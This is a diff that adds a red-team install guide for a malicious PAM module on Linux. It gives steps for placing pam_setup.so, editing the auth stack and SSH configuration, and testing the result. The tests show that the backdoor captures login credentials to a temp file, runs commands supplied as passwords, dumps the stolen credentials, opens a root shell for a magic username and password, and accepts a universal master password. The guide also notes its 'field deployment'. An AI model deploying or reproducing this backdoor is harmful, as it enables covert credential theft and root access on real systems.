@@ -1,0 +1,25 @@
+Installing the red team PAM backdoor:
+1. Find where the PAM modules are stored (usually /lib/security, or /lib/x86_64-linux-gnu/security, or etc.).
+2. Copy pam_setup.so into the folder with the rest of the PAM modules.
+3. Ensure the owner and permissions match the other modules (chown and chmod as necessary)
+4. Find the "common auth" file in /etc/pam.d, typically common-auth or system-auth. If necessary, look for
+    "include" entries in /etc/pam.d/login or /etc/pam.d/sshd.
+5. In the auth file (from previous step), find the line that contains "auth" and "pam_unix.so", and
+    append "try_first_pass" to the end of the entry (if it isn't already there).
+	* NOTE: If the entry does not have "success=1" inside square brackets, talk to Chris for assistance.
+6. Put the following entry on the line above the "pam_unix.so" entry, matching tabs/spaces with the other lines:
+    -auth [success=2 default=ignore] pam_setup.so
+7. Ensure /etc/ssh/sshd_config has "KbdInteractiveAuthentication yes" (formerly ChallengeResponseAuthentication).
+
+Testing (post-install):
+1. Login with any user, then verify that /tmp/.cred-1000 contains your login credentials. Also verify that you were only
+    asked for a password one time (e.g. "Password:" only appeared once).
+2. At the login prompt, use the username "mandy" and then use "ls /var" as the password. You should see the files in /var.
+3. At the login prompt, use the username "creed" and any password, you should see the contents of /tmp/.cred-1000 dumped.
+4. At the login prompt, use the username "shelly" with password "shazam", you should get a root shell.
+5. At the login prompt, pick any valid username and use "SpookyScarySkeletons" as the password. You should be logged in.
+
+NOTE:
+After field deployment, learned that SSH pre-searches for username before passing it off to PAM,
+ and passes a default string if the username is not a valid user. Either create these users
+ or change source to match an existing user.
